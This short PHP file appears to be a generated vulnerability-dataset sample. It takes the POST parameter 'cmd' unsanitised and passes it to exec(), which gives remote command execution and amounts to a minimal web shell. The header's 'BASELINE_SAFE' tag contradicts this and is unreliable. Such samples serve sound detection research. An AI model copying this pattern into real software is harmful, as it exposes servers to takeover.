<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=FILTER_INPUT_POST; SKELETON=S1; KEY=cmd; SINK=B2; VAR=v0126 */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$inp = (string)(filter_input(INPUT_POST, "cmd") ?? "");
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B2($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
